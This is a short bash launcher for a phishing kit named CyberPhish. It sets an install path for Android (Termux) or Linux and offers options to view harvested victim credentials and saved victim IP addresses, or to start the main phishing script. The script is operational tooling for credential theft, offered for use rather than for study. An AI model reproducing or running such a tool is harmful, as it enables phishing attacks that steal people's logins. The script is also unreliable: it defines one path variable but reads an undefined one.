#!/bin/bash

# https://github.com/linuxsujith

if [[ $(uname -o) == *'Android'* ]];then
	Cyber_Phish="/data/data/com.termux/files/usr/opt/CyberPhish"
else
	export Cyber_Phish="/opt/CyberPhish"
fi

if [[ $1 == '-h' || $1 == 'help' ]]; then
	echo "To CyberPhish type \`CyberPhish\` in your cmd"
	echo
	echo "Help:"
	echo " -h | help : Print this menu & Exit"
	echo " -c | auth : View Saved Credentials"
	echo " -i | ip   : View Saved Victim IP"
	echo
elif [[ $1 == '-c' || $1 == 'auth' ]]; then
	cat $CyberPhish_ROOT/auth/usernames.dat 2> /dev/null || { 
		echo "No Credentials Found !"
		exit 1
	}
elif [[ $1 == '-i' || $1 == 'ip' ]]; then
	cat $CyberPhish_ROOT/auth/ip.txt 2> /dev/null || {
		echo "No Saved IP Found !"
		exit 1
	}
else
	cd $CyberPhish_ROOT
	bash ./CyberPhish.sh
fi
